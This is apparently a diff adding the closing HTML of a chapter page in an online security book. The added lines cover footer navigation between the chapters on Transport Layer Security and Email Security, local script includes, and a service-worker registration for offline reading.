+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+Back to top
+</button>
+</main>
+<footer class="md-footer">
+<nav class="md-footer__inner md-grid" aria-label="Footer" >
+<a href="ch16-transport-layer-security.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: 16. Transport Layer Security">
+<div class="md-footer__button md-icon">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+</div>
+<div class="md-footer__title">
+<span class="md-footer__direction">
+Previous
+</span>
+<div class="md-ellipsis">
+16. Transport Layer Security
+</div>
+</div>
+</a>
+<a href="ch18-email-security.html" class="md-footer__link md-footer__link--next" aria-label="Next: 18. Email Security">
+<div class="md-footer__title">
+<span class="md-footer__direction">
+Next
+</span>
+<div class="md-ellipsis">
+18. Email Security
+</div>
+</div>
+<div class="md-footer__button md-icon">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+</div>
+</a>
+</nav>
+<div class="md-footer-meta md-typeset">
+<div class="md-footer-meta__inner md-grid">
+<div class="md-copyright">
+<div class="md-copyright__highlight">
+The Open Book Project &middot;
+<a href="../../about.html">About this library</a> &middot;
+<a href="../../publish.html">Publish your book</a> &middot;
+© The authors of the books
+</div>
+Made with
+<a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+Material for MkDocs
+</a>
+</div>
+</div>
+</div>
+</footer>
+</div>
+<div class="md-dialog" data-md-component="dialog">
+<div class="md-dialog__inner md-typeset"></div>
+</div>
+<script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.indexes", "navigation.prune", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "toc.follow", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+<script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+<script src="../../assets/mathjax.js"></script>
+<script src="../../assets/viz.js"></script>
+<script src="../../assets/remote.js"></script>
+<script src="../../assets/scans.js"></script>
+<script src="../../assets/reader.js"></script>
+<script src="../../assets/app.js"></script>
+<script src="../../assets/slides.js"></script>
+<script src="../../assets/speak.js"></script>
+<script src="../../assets/quiz.js"></script>
+<script>
+    /* offline reading: the service worker at the site root (its scope is the whole site) */
+    if ("serviceWorker" in navigator && window.isSecureContext) {
+      window.addEventListener("load", function () {
+        navigator.serviceWorker.register(new URL("../../sw.js", location.href).href).catch(function () {});
+      });
+    }
+  </script>
+</body>
+</html>
